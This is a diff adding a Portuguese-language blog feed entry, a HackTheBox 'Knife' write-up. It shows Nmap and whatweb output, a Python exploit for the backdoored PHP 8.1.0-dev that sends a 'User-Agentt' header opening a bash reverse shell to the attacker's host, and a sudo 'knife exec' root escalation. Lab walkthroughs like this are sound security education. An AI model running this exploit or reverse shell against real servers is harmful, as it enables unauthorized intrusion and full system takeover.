@@ -1031,6 +1031,182 @@ a uma prioridade padrão associada ao e-mail.
         </item>
         
         <item>
+            <title>HackTheBox - Knife</title>
+            <link>https://brunomcuesta.github.io/posts/2021/06/hackthebox-knife/</link>
+            <pubDate>Tue, 22 Jun 2021 14:21:29 -0300</pubDate>
+            
+            <guid>https://brunomcuesta.github.io/posts/2021/06/hackthebox-knife/</guid>
+            <description>Neste &amp;lsquo;writeup&amp;rsquo; veremos a resolução da máquina &amp;lsquo;Knife&amp;rsquo; do HackTheBox.
+Informações da Máquina IP: 10.10.10.242
+Sistema Operacional: Linux
+Nível de dificuldade: Easy
+Varredura e Enumeração Port Scan Duas portas abertas foram descobertas com o Nmap: 22 e 80. Abaixo o resultado do Nmap executando o scan com os scripts padrão.
+# Nmap 7.91 scan initiated Mon Jun 21 18:20:19 2021 as: nmap -v -sC -sV -p 22,80 -Pn -oN details.</description>
+            <content type="html"><![CDATA[
+    <img src="https://i.imgur.com/x3iE4nH.jpg"  alt="Knife Cover"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Knife&rsquo; do <a href="https://www.hackthebox.eu/">HackTheBox</a>.</p>
+<h2 id="informações-da-máquina">Informações da Máquina</h2>
+<p>IP: 10.10.10.242</p>
+<p>Sistema Operacional: Linux</p>
+<p>Nível de dificuldade: Easy</p>
+<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
+<h3 id="port-scan">Port Scan</h3>
+<p>Duas portas abertas foram descobertas com o Nmap: 22 e 80.
+Abaixo o resultado do Nmap executando o scan com os scripts padrão.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Mon Jun 21 18:20:19 2021 as: nmap -v -sC -sV -p 22,80 -Pn -oN details.txt 10.10.10.242</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.242
+Host is up <span style="color:#f92672">(</span>0.26s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e🆎22:0e:c0:ee <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 1a🇩🇪a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Mon Jun 21 18:20:41 2021 -- 1 IP address (1 host up) scanned in 22.53 seconds</span>
+</code></pre></div><h3 id="webserver">Webserver</h3>
+<p>O resultado do comando Nmap mostra a porta 80 aberta e ao acessar o ip da máquina é possível visualizar uma página html.</p>
+
+    <img src="https://i.imgur.com/gKGRBIR.png"  alt="Página Inicial"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Para acessar o site pelo seu domínio e não pelo seu ip basta inserir a linha correspondente ao arquivo /etc/hosts.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.242  knife.htb
+</code></pre></div><p>O site poderá ser acessado pela seguinte URL.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://knife.htb
+</code></pre></div><p>Ao examinar o código fonte da página nada foi encontrado. A enumeração de diretórios e arquivos também não mostrou nada relevante exposto pelo servidor, além da página principal. Isto indica que a vulnerabilidade pode estar em alguma tecnologia presente que não foi atualizada. Neste caso é necessário verificar a versão do que está sendo utilizado no host. Para esta tarefa foi utilizado o &lsquo;whatweb&rsquo;.</p>
+
+    <img src="https://i.imgur.com/UJ13k90.png"  alt="Whatweb"  class="center"  style="border-radius: 8px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://10.10.10.242 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.41<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>,
+HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>,
+IP<span style="color:#f92672">[</span>10.10.10.242<span style="color:#f92672">]</span>, PHP<span style="color:#f92672">[</span>8.1.0-dev<span style="color:#f92672">]</span>, Script,
+Title<span style="color:#f92672">[</span>Emergent Medical Idea<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>PHP/8.1.0-dev<span style="color:#f92672">]</span>
+
+</code></pre></div><p>A saída do comando mostra que o servidor roda um Apache/2.4.41 e a linguagem de programação utilizada é o PHP 8.1.0-dev.</p>
+<h2 id="vulnerabilidade">Vulnerabilidade</h2>
+<p>Buscando por vulnerabilidade nesta versão de PHP foi possível encontrar um exploit disponível no <a href="https://www.exploit-db.com/exploits/49933">ExploitDB</a>.</p>
+
+    <img src="https://i.imgur.com/XTP24m5.png"  alt="Whatweb"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="exploração">Exploração</h2>
+<p>O exploit consiste em um script python que envia um &lsquo;User-Agentt&rsquo; alterado, permitindo a execução de um RCE (Remote Code Execution) no host. Com o exploit é possível obter um shell interativo.</p>
+
+    <img src="https://i.imgur.com/0B8JQJQ.png"  alt="Exploit"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Listando o diretório &lsquo;home&rsquo; do usuário james:</p>
+
+    <img src="https://i.imgur.com/aGDKFF9.png"  alt="Home"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Apesar de ser útil para obter mais informações do host e inclusive a &lsquo;flag&rsquo; do user.txt na &lsquo;home&rsquo; do usuário james, a alteração do script para obter um &lsquo;reverse shell&rsquo; é o ideal. A linha do &ldquo;User-Agentt&rdquo; foi alterada, removendo o &ldquo;cmd&rdquo; como payload e colocando em seu lugar uma conexão reversa em bash passando como parâmetro o ip e porta da máquina local do atacante.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> re
+<span style="color:#f92672">import</span> requests
+
+host <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter the full host url (http://host/): &#34;</span>)
+ip <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Local IP: &#34;</span>)
+port <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Local Port: &#34;</span>)
+request <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+response <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get(host)
+
+<span style="color:#66d9ef">if</span> str(response) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&lt;Response [200]&gt;&#39;</span>:
+    <span style="color:#66d9ef">try</span>:
+        headers <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#34;</span>,
+        <span style="color:#e6db74">&#34;User-Agentt&#34;</span>: <span style="color:#e6db74">&#34;zerodiumsystem(&#39;/bin/bash -c </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">bash -i &gt;&amp;/dev/tcp/{}/{} 0&gt;&amp;1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#39;);&#34;</span><span style="color:#f92672">.</span>format(ip,port)
+        }
+        response <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get(host, headers <span style="color:#f92672">=</span> headers, allow_redirects <span style="color:#f92672">=</span> False)
+    <span style="color:#66d9ef">except</span> (<span style="color:#a6e22e">KeyboardInterrupt</span>):
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Exiting...&#34;</span>)
+        exit
+
+<span style="color:#66d9ef">else</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">print</span>(response)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Host is not available, aborting...&#34;</span>)
+    exit
+</code></pre></div><p>Após executar o script informando o ip do host e o ip e porta da máquina local obtemos um &lsquo;reverse shell&rsquo;.</p>
+
+    <img src="https://i.imgur.com/UOKMFPe.png"  alt="Reverse Shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Obtendo a flag do user.txt:</p>
+
+    <img src="https://i.imgur.com/0hLN4jy.png"  alt="James flag"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Enumerando internamente o diretório /var/www/html apenas uma página index.html foi encontrada. Porém no diretório /opt podemos encontrar outros dois diretórios que pertencem a um software de terceiros (chef-workstation e opscode). Inclusive na &lsquo;home&rsquo; do usuário é possível verificar a existência do diretório oculto &ldquo;.chef&rdquo; com um arquivo &ldquo;credentials&rdquo;.</p>
+
+    <img src="https://i.imgur.com/uuTctBo.png"  alt="Chef"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Buscando por &lsquo;chef&rsquo; encontramos mais informações sobre este software na página do <a href="https://docs.chef.io/platform_overview/">desenvolvedor</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Chef é uma empresa de automação. Desde sua fundação em 2008, reunimos
+desenvolvedores e administradores de sistema com nosso produto homônimo, Chef Infra.
+Com o passar dos anos, o que entendemos por automação se expandiu.
+Hoje, o Chef tem uma solução de automação completa para infraestrutura
+e aplicativos que o leva desde o desenvolvimento até a produção.
+</code></pre></div><p>Como se trata de um software de automação o mais provável é que o usuário james possa executar algum binário ou script com permissões de root e assim será possível escalar privilégio na máquina.</p>
+<h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
+<p>O primeiro passo é saber se o usuário james está incluído no &lsquo;sudoers&rsquo; e se possui alguma permissão específica para executar algum script ou binário.</p>
+
+    <img src="https://i.imgur.com/ARoPIT2.png"  alt="Sudo"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>A saída do comando mostra que o arquivo /usr/bin/knife pode ser executado pelo usuário james com permissão de root e sem a necessidade de informar a senha do usuário.</p>
+<p>Com o comando &lsquo;file&rsquo; descobrimos que o arquivo &lsquo;knife&rsquo; é na realidade um link simbólico para outro de mesmo nome dentro do diretório &lsquo;chef-workstation&rsquo;.</p>
+
+    <img src="https://i.imgur.com/EeHp6TH.png"  alt="File"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Portanto, o &lsquo;knife&rsquo; é um utilitário de automação do &lsquo;chef-workstation&rsquo; e para descobrir como usá-lo para escalar privilégio é necessário pesquisar no site do <a href="https://docs.chef.io/workstation/knife/">desenvolvedor</a>.</p>
+
+    <img src="https://i.imgur.com/5oJoPve.png"  alt="Knife"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>O parâmetro que permite a execução de scripts ruby ou algum comando do sistema é o <a href="https://docs.chef.io/workstation/knife_exec/">exec</a>.</p>
+
+    <img src="https://i.imgur.com/mbyGj3I.png"  alt="Knife Exec"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Pode ser visualizado também ao executar o arquivo e buscar no seu menú de opções:</p>
+
+    <img src="https://i.imgur.com/XYe0CVe.png"  alt="Knife Menú"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Este é o comando utilizado para obter root:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo knife exec --exec <span style="color:#e6db74">&#34;exec &#39;/bin/bash -i&#39;&#34;</span>
+</code></pre></div>
+    <img src="https://i.imgur.com/0bj2R32.png"  alt="Root"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Obtendo a flag do root:</p>
+
+    <img src="https://i.imgur.com/RIrn163.png"  alt="Root Flag"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Neste &lsquo;writeup&rsquo; foi demonstrado como invadir a máquina &lsquo;knife&rsquo; através da exploração de um software desatualizado (PHP) no servidor. Logo em seguida, com uma enumeração básica na máquina, foi descoberto que o usuário &lsquo;james&rsquo; pode executar um script (knife) com permissões de root, bastando que o &lsquo;script&rsquo; seja executado com o &lsquo;sudo&rsquo; e sem o uso de senha do usuário, o que é considerado uma falha de segurança.</p>
+<p>Até a próxima!</p>
+]]></content>
+        </item>
+        
+        <item>
             <title>HackTheBox - Jewel</title>
             <link>https://brunomcuesta.github.io/posts/2021/02/hackthebox-jewel/</link>
             <pubDate>Sat, 20 Feb 2021 10:00:00 -0300</pubDate>
